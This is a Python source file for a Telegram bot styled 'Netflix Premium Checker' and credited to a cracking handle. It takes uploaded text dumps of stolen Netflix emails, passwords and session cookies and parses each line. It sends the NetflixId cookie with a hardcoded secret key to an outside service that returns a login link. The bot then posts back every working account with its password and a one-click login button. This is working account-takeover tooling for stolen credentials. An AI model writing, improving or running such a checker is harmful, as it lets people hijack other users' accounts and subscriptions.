import logging
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import os
from dotenv import load_dotenv
from pathlib import Path
import time
from collections import defaultdict
import asyncio
import re
import json

# Load environment variables
env_path = Path(__file__).parent / '.env'
load_dotenv(dotenv_path=env_path)

# ==================== YOUR API CONFIGURATION ====================
TOKEN = os.getenv('BOT_TOKEN')
API_URL = "http://genznfapi.onrender.com"  # YOUR API
SECRET_KEY = "KUROSAKI3DAY_d5Cl7U5mpXy2DL2ZrwS0Go47PCNYdjqB"  # YOUR SECRET KEY

# YOUR CREDIT
YOUR_CREDIT = "@CrackByLIM"

if not TOKEN:
    print("❌ ERROR: BOT_TOKEN not found!")
    exit(1)

# ==================== FIX FOR CONFLICT ERROR ====================
def clear_telegram_webhook():
    """Clear any existing webhook/sessions to prevent conflict"""
    try:
        webhook_url = f"https://api.telegram.org/bot{TOKEN}/deleteWebhook"
        response = requests.post(webhook_url)
        print(f"✅ Webhook cleared: {response.json()}")
        
        get_updates_url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
        requests.post(get_updates_url, json={"offset": -1, "timeout": 0})
        print("✅ Pending updates cleared")
        
        time.sleep(2)
    except Exception as e:
        print(f"⚠️ Warning while clearing webhook: {e}")

# Call this before starting the bot
clear_telegram_webhook()
# =============================================================

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# User session storage
user_sessions = {}
rate_limits = defaultdict(list)

# Stats tracking
total_checks = 0
valid_accounts = 0
invalid_accounts = 0

# ==================== MULTI-LANGUAGE SUPPORT ====================

LANGUAGES = {
    'en': {
        'name': 'English',
        'flag': '🇺🇸',
        'welcome': 'Welcome',
        'start': 'Start',
        'help': 'Help',
        'stats': 'Statistics',
        'clear': 'Clear',
        'language': 'Language',
        'processing': 'Processing',
        'valid': 'VALID',
        'invalid': 'INVALID',
        'email': 'Email',
        'password': 'Password',
        'country': 'Country',
        'phone': 'Phone',
        'plan': 'Plan',
        'quality': 'Quality',
        'streams': 'Max Streams',
        'login_link': 'Login Link',
        'launch': '🎬 LAUNCH NETFLIX',
        'powered_by': 'Powered by',
        'file_received': 'FILE RECEIVED',
        'analyzing': 'ANALYZING FILE',
        'complete': 'PROCESSING COMPLETE',
        'results': 'RESULTS SUMMARY',
        'valid_found': 'Valid Accounts Found',
        'invalid_found': 'Invalid Accounts',
        'success_rate': 'Success Rate',
        'no_valid': 'No valid accounts found',
        'error_occurred': 'ERROR OCCURRED',
        'rate_limit': 'Rate limit exceeded',
        'wrong_format': 'Please upload a .txt file',
        'no_cookies': 'No Netflix cookies found',
        'decoding': 'Decoding special characters',
        'removing_emoji': 'Removing emoji',
    },
    'zh': {
        'name': '中文',
        'flag': '🇨🇳',
        'welcome': '欢迎',
        'start': '开始',
        'help': '帮助',
        'stats': '统计',
        'clear': '清除',
        'language': '语言',
        'processing': '处理中',
        'valid': '有效',
        'invalid': '无效',
        'email': '邮箱',
        'password': '密码',
        'country': '国家',
        'phone': '电话',
        'plan': '套餐',
        'quality': '画质',
        'streams': '最大流',
        'login_link': '登录链接',
        'launch': '🎬 启动NETFLIX',
        'powered_by': '技术支持',
        'file_received': '已接收文件',
        'analyzing': '分析文件中',
        'complete': '处理完成',
        'results': '结果总结',
        'valid_found': '有效账户',
        'invalid_found': '无效账户',
        'success_rate': '成功率',
        'no_valid': '未找到有效账户',
        'error_occurred': '发生错误',
        'rate_limit': '请求过多，请稍后再试',
        'wrong_format': '请上传.txt文件',
        'no_cookies': '未找到Netflix cookies',
        'decoding': '解码特殊字符',
        'removing_emoji': '移除表情符号',
    },
    'km': {
        'name': 'ខ្មែរ',
        'flag': '🇰🇭',
        'welcome': 'ស្វាគមន៍',
        'start': 'ចាប់ផ្តើម',
        'help': 'ជំនួយ',
        'stats': 'ស្ថិតិ',
        'clear': 'សម្អាត',
        'language': 'ភាសា',
        'processing': 'កំពុងដំណើរការ',
        'valid': 'ត្រឹមត្រូវ',
        'invalid': 'មិនត្រឹមត្រូវ',
        'email': 'អ៊ីមែល',
        'password': 'ពាក្យសម្ងាត់',
        'country': 'ប្រទេស',
        'phone': 'ទូរស័ព្ទ',
        'plan': 'កញ្ចប់',
        'quality': 'គុណភាព',
        'streams': 'ស្ទ្រីមអតិបរមា',
        'login_link': 'តំណចូល',
        'launch': '🎬 ចូល NETFLIX',
        'powered_by': 'ដំណើរការដោយ',
        'file_received': 'បានទទួលឯកសារ',
        'analyzing': 'កំពុងវិភាគឯកសារ',
        'complete': 'ដំណើរការបានបញ្ចប់',
        'results': 'សង្ខេបលទ្ធផល',
        'valid_found': 'គណនីត្រឹមត្រូវ',
        'invalid_found': 'គណនីមិនត្រឹមត្រូវ',
        'success_rate': 'អត្រាជោគជ័យ',
        'no_valid': 'រកមិនឃើញគណនីត្រឹមត្រូវទេ',
        'error_occurred': 'មានបញ្ហា',
        'rate_limit': 'សំណើច្រើនពេក សូមរង់ចាំ',
        'wrong_format': 'សូមផ្ញើឯកសារ .txt',
        'no_cookies': 'រកមិនឃើញ Netflix cookies ទេ',
        'decoding': 'កំពុងឌិកូដតួអក្សរពិសេស',
        'removing_emoji': 'កំពុងដកអេម៉ូជីចេញ',
    }
}

# ==================== UNIVERSAL MULTI-FORMAT PARSER ====================

def decode_special_chars(text):
    """Decode special characters like \x20, \x28, \x29 into normal text"""
    if not text:
        return text
    
    # Replace common encoded characters
    replacements = {
        r'\x20': ' ',    # space
        r'\x28': '(',    # open parenthesis
        r'\x29': ')',    # close parenthesis
        r'\x26': '&',    # ampersand
        r'\x3D': '=',    # equals sign
        r'\x2C': ',',    # comma
        r'\x2E': '.',    # period
        r'\x2D': '-',    # hyphen
        r'\x5F': '_',    # underscore
        r'\x2F': '/',    # forward slash
        r'\x5C': '\\',   # backslash
        r'\x3A': ':',    # colon
        r'\x3B': ';',    # semicolon
        r'\x40': '@',    # at symbol
        r'\x23': '#',    # hash
        r'\x24': '$',    # dollar
        r'\x25': '%',    # percent
        r'\x2B': '+',    # plus
        r'\x3C': '<',    # less than
        r'\x3E': '>',    # greater than
        r'\x7B': '{',    # open brace
        r'\x7D': '}',    # close brace
        r'\x5B': '[',    # open bracket
        r'\x5D': ']',    # close bracket
        r'\x7C': '|',    # pipe
        r'\x60': '`',    # backtick
        r'\x27': "'",    # single quote
        r'\x22': '"',    # double quote
    }
    
    for encoded, decoded in replacements.items():
        text = text.replace(encoded, decoded)
    
    return text

def remove_emoji(text):
    """Remove emoji characters from text"""
    if not text:
        return text
    
    # This regex matches most emoji characters
    emoji_pattern = re.compile("["
        u"\U0001F600-\U0001F64F"  # emoticons
        u"\U0001F300-\U0001F5FF"  # symbols & pictographs
        u"\U0001F680-\U0001F6FF"  # transport & map symbols
        u"\U0001F1E0-\U0001F1FF"  # flags (iOS)
        u"\U00002702-\U000027B0"  # dingbats
        u"\U000024C2-\U0001F251"  # enclosed characters
        u"\U0001F900-\U0001F9FF"  # supplemental symbols
        u"\U0001FA70-\U0001FAFF"  # symbols and pictographs extended
        u"\U00002600-\U000026FF"  # miscellaneous symbols
        u"\U00002B50-\U00002B55"  # stars
        u"\U0001F004-\U0001F0CF"  # playing cards
        u"\U0001F170-\U0001F251"  # enclosed alphanumeric
        u"\U0001F201-\U0001F21A"  # enclosed ideographic supplement
        u"\U0001F232-\U0001F23B"  # enclosed ideographic supplement
        u"\U0001F250-\U0001F251"  # enclosed ideographic supplement
        u"\U0001F300-\U0001F5FF"  # symbols and pictographs
        u"\U0001F600-\U0001F64F"  # emoticons
        u"\U0001F680-\U0001F6FF"  # transport and map symbols
        u"\U0001F900-\U0001F9FF"  # supplemental symbols
        u"\U0001FA70-\U0001FAFF"  # symbols and pictographs extended
        u"\U00002600-\U000026FF"  # miscellaneous symbols
        u"\U00002700-\U000027BF"  # dingbats
        u"\U0001F1E6-\U0001F1FF"  # regional indicator symbols
        "]+", flags=re.UNICODE)
    
    return emoji_pattern.sub(r'', text).strip()

def parse_account_line(line):
    """
    Universal parser that handles multiple formats:
    
    Format A: email:password | Country = United States 🇺🇸 | Plan = Premium\x20\x28Extra\x20Member\x29 | NetflixCookies = NetflixId=...
    Format B: email:password | Phone: +17604584487 | Country: United States | Cookie: NetflixId=...
    
    Supports:
    - Both : and = as separators
    - Cookie field can be "Cookie" or "NetflixCookies"
    - Removes emoji from country field
    - Decodes special characters like \x20, \x28, \x29
    - Extracts email, password, cookie, and optional fields
    """
    try:
        line = line.strip()
        if not line:
            return None
        
        account = {}
        
        # First, decode any special characters in the entire line
        line = decode_special_chars(line)
        
        # Split by | to get each field
        fields = line.split('|')
        
        # First field contains email:password
        first_field = fields[0].strip()
        if ':' in first_field:
            email_pass = first_field.split(':', 1)
            account['email'] = email_pass[0].strip()
            account['password'] = email_pass[1].strip()
        
        # Parse remaining fields
        for field in fields[1:]:
            field = field.strip()
            if not field:
                continue
            
            # Try both : and = as separators
            separator = None
            if ':' in field:
                separator = ':'
            elif '=' in field:
                separator = '='
            else:
                continue
            
            key, value = field.split(separator, 1)
            key = key.strip().lower()
            value = value.strip()
            
            # Handle different field types
            if 'country' in key:
                # Remove emoji from country
                account['country'] = remove_emoji(value)
            
            elif 'phone' in key:
                account['phone'] = value
            
            elif 'plan' in key:
                account['plan'] = value
            
            elif 'quality' in key or 'video' in key:
                account['quality'] = value
            
            elif 'stream' in key or 'max' in key:
                account['max_streams'] = value
            
            elif 'cookie' in key or 'netflixcookies' in key or 'netflixcookiess' in key:
                account['full_cookie'] = value
                # Extract NetflixId from cookie
                netflix_match = re.search(r'NetflixId=([^&\s]+)', value)
                if netflix_match:
                    account['netflix_id'] = netflix_match.group(1).strip()
        
        # Validate we have the minimum required fields
        if 'netflix_id' not in account:
            logger.warning("❌ No NetflixId found in line")
            return None
        
        if 'email' not in account:
            account['email'] = f"user_{account['netflix_id'][:8]}@unknown.com"
        
        # Clean up any remaining encoded characters in all fields
        for key, value in account.items():
            if isinstance(value, str):
                account[key] = decode_special_chars(value)
        
        logger.info(f"✅ Parsed account: {account['email']}")
        return account
        
    except Exception as e:
        logger.error(f"Error parsing line: {e}")
        return None

# ==================== YOUR API FUNCTIONS ====================

async def check_with_your_api(netflix_id, email):
    """Check Netflix ID using YOUR API - with proper error handling"""
    
    if not netflix_id:
        return {
            "success": False,
            "error": "No Netflix ID provided",
            "error_code": "MISSING_ID",
            "email": email
        }
    
    try:
        # YOUR API endpoint - exactly as specified
        url = f"{API_URL}/api/gen"
        
        # Data payload exactly as your API expects
        data = {
            "netflix_id": netflix_id,
            "secret_key": SECRET_KEY
        }
        
        logger.info(f"📡 Calling YOUR API for {email}")
        logger.info(f"🔑 Netflix ID: {netflix_id[:30]}...")
        
        # Make the POST request as specified in your instructions
        response = requests.post(url, json=data, timeout=15)
        result = response.json()
        
        logger.info(f"📥 API Response: {result}")
        
        # Check if API call was successful according to YOUR API's format
        if result.get('success') == True:
            login_url = result.get('login_url')
            if login_url:
                logger.info(f"✅ VALID ACCOUNT: {email}")
                return {
                    "success": True,
                    "login_url": login_url,
                    "email": email,
                    "message": "Account is valid!"
                }
            else:
                return {
                    "success": False,
                    "error": "API returned success but no login URL",
                    "error_code": "MISSING_URL",
                    "email": email
                }
        else:
            # Handle error responses from YOUR API
            error_code = result.get('error_code', 'UNKNOWN_ERROR')
            error_msg = result.get('error', 'Unknown error')
            
            # Map error codes to user-friendly messages
            error_messages = {
                'INVALID_RESPONSE_FORMAT': "Netflix ID is invalid or expired",
                'INVALID_NETFLIX_ID': "Netflix ID is invalid or expired",
                'SERVER_ERROR': "Netflix server error - try again later",
                'MISSING_NETFLIX_ID': "No Netflix ID provided",
                'INVALID_SECRET_KEY': "API configuration error - contact admin",
                'AUTH_URL_EXTRACTION_FAILED': "Could not generate login link",
                'MAINTENANCE_MODE': "API is under maintenance - try again later"
            }
            
            user_message = error_messages.get(error_code, f"Error: {error_msg}")
            
            logger.warning(f"❌ INVALID ACCOUNT: {email} - {user_message}")
            
            return {
                "success": False,
                "error": user_message,
                "error_code": error_code,
                "raw_error": error_msg,
                "email": email
            }
                
    except requests.exceptions.Timeout:
        return {
            "success": False,
            "error": "API request timed out",
            "error_code": "TIMEOUT",
            "email": email
        }
    except requests.exceptions.ConnectionError:
        return {
            "success": False,
            "error": "Cannot connect to API server",
            "error_code": "CONNECTION_ERROR",
            "email": email
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "error_code": "UNKNOWN_ERROR",
            "email": email
        }

# ==================== LANGUAGE SELECTION ====================

async def language_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show language selection menu"""
    keyboard = [
        [
            InlineKeyboardButton(f"{LANGUAGES['en']['flag']} English", callback_data='lang_en'),
            InlineKeyboardButton(f"{LANGUAGES['zh']['flag']} 中文", callback_data='lang_zh'),
        ],
        [
            InlineKeyboardButton(f"{LANGUAGES['km']['flag']} ខ្មែរ", callback_data='lang_km'),
        ]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🌐 **Select your language / 选择语言 / ជ្រើសរើសភាសា**",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def language_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle language selection"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    lang_code = query.data.replace('lang_', '')
    
    # Store user's language preference
    if user_id not in user_sessions:
        user_sessions[user_id] = {}
    user_sessions[user_id]['language'] = lang_code
    
    lang = LANGUAGES[lang_code]
    
    await query.edit_message_text(
        f"✅ **{lang['flag']} {lang['name']} selected!**\n\n"
        f"Use /start to begin.",
        parse_mode='Markdown'
    )

def get_lang(user_id):
    """Get user's selected language"""
    if user_id in user_sessions and 'language' in user_sessions[user_id]:
        return user_sessions[user_id]['language']
    return 'en'  # Default to English

# ==================== BOT COMMANDS ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command with multi-language support"""
    user = update.effective_user
    user_id = user.id
    lang_code = get_lang(user_id)
    lang = LANGUAGES[lang_code]
    
    welcome = f"""
╔══════════════════════════════════════════╗
║     🎬 **NETFLIX PREMIUM CHECKER** 🎬    ║
║          {lang['flag']} {lang['name']} version          ║
╚══════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌟 **{lang['welcome']} {user.first_name}!** 🌟
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📤 **Send a .txt file** with accounts in any format:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ Supports both `:` and `=` separators
✅ Removes emoji from country names
✅ Decodes special characters like `\x20`
✅ Recognizes `Cookie` or `NetflixCookies`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✨ **Features:**
✅ Multi-language support (EN/中文/ខ្មែរ)
✅ Universal format parser
✅ Professional account validation
✅ Real-time progress tracking

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 **Commands:**
/help - {lang['help']} ℹ️
/stats - {lang['stats']} 📊
/language - {lang['language']} 🌐
/clear - {lang['clear']} 🧹

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **{lang['powered_by']} {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    
    await update.message.reply_text(welcome, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command with multi-language support"""
    user_id = update.effective_user.id
    lang_code = get_lang(user_id)
    lang = LANGUAGES[lang_code]
    
    help_text = f"""
╔══════════════════════════════════════════╗
║            🆘 **{lang['help']}** 🆘            ║
╚══════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📁 **HOW TO USE / 使用方法 / របៀបប្រើ**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1️⃣ **Prepare your .txt file**
   • One account per line
   • Use `|` to separate fields
   • Must include Cookie with NetflixId=

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📝 **SUPPORTED FORMATS:**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**Format A (with =):**
`email:password | Country = United States 🇺🇸 | Plan = Premium\x20\x28Extra\x20Member\x29 | NetflixCookies = NetflixId=...`

**Format B (with :):**
`email:password | Phone: +1234567890 | Country: United States | Cookie: NetflixId=...`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔧 **What the bot does:**
• Removes 🇺🇸 emoji from country
• Decodes `\x20\x28Extra\x20Member\x29` → ` (Extra Member)`
• Finds cookie in any field name
• Extracts email, password, and NetflixId

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **{lang['powered_by']} {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show statistics with multi-language support"""
    global total_checks, valid_accounts, invalid_accounts
    user_id = update.effective_user.id
    lang_code = get_lang(user_id)
    lang = LANGUAGES[lang_code]
    
    success_rate = valid_accounts/total_checks*100 if total_checks > 0 else 0
    
    stats_text = f"""
╔══════════════════════════════════════════╗
║        📊 **{lang['stats']}** 📊        ║
╚══════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📈 **{lang['results']}:**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• **{lang['valid_found']}:**
  `{valid_accounts}`
• **{lang['invalid_found']}:**
  `{invalid_accounts}`
• **{lang['success_rate']}:**
  `{success_rate:.1f}%`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **{lang['powered_by']} {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    
    await update.message.reply_text(stats_text, parse_mode='Markdown')

async def clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Clear user session"""
    user_id = update.effective_user.id
    lang_code = get_lang(user_id)
    lang = LANGUAGES[lang_code]
    
    if user_id in user_sessions:
        # Keep language preference but clear other data
        lang_pref = user_sessions[user_id].get('language', 'en')
        user_sessions[user_id] = {'language': lang_pref}
    
    await update.message.reply_text(
        f"✅ **{lang['clear']}**\n\nYou can now upload a new file.",
        parse_mode='Markdown'
    )

# ==================== FILE HANDLER WITH MULTI-LANGUAGE ====================

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle uploaded .txt files with beautiful output"""
    user_id = update.effective_user.id
    lang_code = get_lang(user_id)
    lang = LANGUAGES[lang_code]
    
    global total_checks, valid_accounts, invalid_accounts
    
    if not check_rate_limit(user_id):
        await update.message.reply_text(
            f"⏰ **{lang['rate_limit']}**",
            parse_mode='Markdown'
        )
        return
    
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text(
            f"❌ **{lang['wrong_format']}**",
            parse_mode='Markdown'
        )
        return
    
    # Beautiful progress message
    progress_msg = await update.message.reply_text(
        f"""
╔══════════════════════════════════════════╗
║     📥 **{lang['file_received']}** 📥     ║
╚══════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📄 **File:** `{document.file_name}`
⏳ **Status:** Downloading...
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚡ **{lang['powered_by']} {YOUR_CREDIT}** ⚡
        """,
        parse_mode='Markdown'
    )
    
    try:
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        content = file_content.decode('utf-8', errors='ignore')
        
        # Split into lines (each line is one account)
        lines = content.split('\n')
        accounts = [line.strip() for line in lines if line.strip()]
        
        await progress_msg.edit_text(
            f"""
╔══════════════════════════════════════════╗
║     📊 **{lang['analyzing']}** 📊     ║
╚══════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📄 **File:** `{document.file_name}`
🔍 **Accounts Found:** `{len(accounts)}`
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚡ **{lang['powered_by']} {YOUR_CREDIT}** ⚡
            """,
            parse_mode='Markdown'
        )
        
        valid_count = 0
        invalid_count = 0
        error_counts = defaultdict(int)
        
        for i, line in enumerate(accounts, 1):
            # Parse the line with universal parser
            account = parse_account_line(line)
            
            if not account:
                invalid_count += 1
                error_counts['PARSING_FAILED'] += 1
                continue
            
            # Update progress with beautiful bar
            if i % 2 == 0 or i == len(accounts):
                progress = i / len(accounts)
                bar_length = 20
                filled = int(bar_length * progress)
                bar = "█" * filled + "░" * (bar_length - filled)
                
                await progress_msg.edit_text(
                    f"""
╔══════════════════════════════════════════╗
║     🔄 **{lang['processing']}...** 🔄     ║
╚══════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **Progress:** `{i}/{len(accounts)}`
📈 **{progress*100:.1f}%** `{bar}`

✅ **{lang['valid_found']}:** `{valid_count}`
❌ **{lang['invalid_found']}:** `{invalid_count}`
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚡ **{lang['powered_by']} {YOUR_CREDIT}** ⚡
                    """,
                    parse_mode='Markdown'
                )
            
            # Check with YOUR API
            result = await check_with_your_api(account['netflix_id'], account['email'])
            
            total_checks += 1
            
            if result.get('success'):
                valid_count += 1
                valid_accounts += 1
                
                # Beautiful valid account output
                details = []
                if account.get('country'):
                    details.append(f"🌍 **{lang['country']}:** `{account['country']}`")
                if account.get('phone'):
                    details.append(f"📞 **{lang['phone']}:** `{account['phone']}`")
                if account.get('plan'):
                    details.append(f"📺 **{lang['plan']}:** `{account['plan']}`")
                if account.get('quality'):
                    details.append(f"🎬 **{lang['quality']}:** `{account['quality']}`")
                
                details_str = '\n'.join(details) if details else ''
                
                msg = f"""
✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨
     ⭐ **{lang['valid']} ACCOUNT #{valid_count}** ⭐     
✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📧 **{lang['email']}:** `{account['email']}`
🔑 **{lang['password']}:** `{account.get('password', 'N/A')}`
{details_str}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔗 **{lang['login_link']}:**
`{result['login_url']}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✨ **{lang['powered_by']} {YOUR_CREDIT}** ✨
                """
                
                keyboard = [[InlineKeyboardButton(lang['launch'], url=result['login_url'])]]
                await update.message.reply_text(
                    msg,
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode='Markdown'
                )
                
            else:
                invalid_count += 1
                invalid_accounts += 1
                error_code = result.get('error_code', 'UNKNOWN')
                error_counts[error_code] += 1
            
            await asyncio.sleep(0.5)
        
        # Beautiful final summary
        success_rate = valid_count/len(accounts)*100 if len(accounts) > 0 else 0
        
        if valid_count > 0:
            summary = f"""
╔══════════════════════════════════════════╗
║     ✅ **{lang['complete']}** ✅     ║
╚══════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **{lang['results']}:**

✨ **{lang['valid_found']}:** `{valid_count}`
💫 **{lang['success_rate']}:** `{success_rate:.1f}%`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 **Valid accounts have been sent above!**

⚡ **{lang['powered_by']} {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """
        else:
            summary = f"""
╔══════════════════════════════════════════╗
║     ❌ **{lang['no_valid']}** ❌     ║
╚══════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **{lang['results']}:**

❌ **{lang['invalid_found']}:** `{invalid_count}`
📈 **Error Breakdown:**

"""
            for error, count in error_counts.items():
                summary += f"   • `{error}`: {count}\n"
            
            summary += f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💡 **Note:** 'INVALID_RESPONSE_FORMAT' means
    the Netflix cookie has expired.

⚡ **{lang['powered_by']} {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """
        
        await progress_msg.edit_text(summary, parse_mode='Markdown')
        
    except Exception as e:
        logger.error(f"Error: {e}")
        await progress_msg.edit_text(
            f"""
╔══════════════════════════════════════════╗
║     ❌ **{lang['error_occurred']}** ❌     ║
╚══════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
❌ **Error:** `{str(e)[:100]}`

💡 Please try again or check file format

⚡ **{lang['powered_by']} {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """,
            parse_mode='Markdown'
        )

# ==================== RATE LIMITING ====================

def check_rate_limit(user_id, limit=5, period=60):
    now = time.time()
    rate_limits[user_id] = [t for t in rate_limits[user_id] if now - t < period]
    if len(rate_limits[user_id]) >= limit:
        return False
    rate_limits[user_id].append(now)
    return True

# ==================== MAIN FUNCTION ====================

async def run_bot():
    """Run the bot"""
    print("=" * 60)
    print("🎬 NETFLIX PREMIUM CHECKER BOT")
    print("=" * 60)
    print(f"✅ Bot Token: {TOKEN[:10]}...")
    print(f"✅ YOUR API: {API_URL}")
    print(f"✅ Credit: {YOUR_CREDIT}")
    print("=" * 60)
    print("🌐 Languages: English, 中文, ខ្មែរ")
    print("🔄 Universal Parser: Supports multiple formats")
    print("🎨 Beautiful Premium Output")
    print("=" * 60)
    
    app = Application.builder().token(TOKEN).build()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("clear", clear_command))
    app.add_handler(CommandHandler("language", language_command))
    app.add_handler(CallbackQueryHandler(language_callback, pattern="^lang_"))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_file))
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling(drop_pending_updates=True)
    
    print("✅ Bot is running! Send a .txt file to test.")
    print("=" * 60)
    
    try:
        while True:
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        print("\n👋 Bot stopped by user")
    finally:
        await app.updater.stop()
        await app.stop()
        await app.shutdown()

def main():
    """Main entry point"""
    try:
        asyncio.run(run_bot())
    except KeyboardInterrupt:
        print("\n👋 Bot stopped by user")
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == '__main__':
    main()
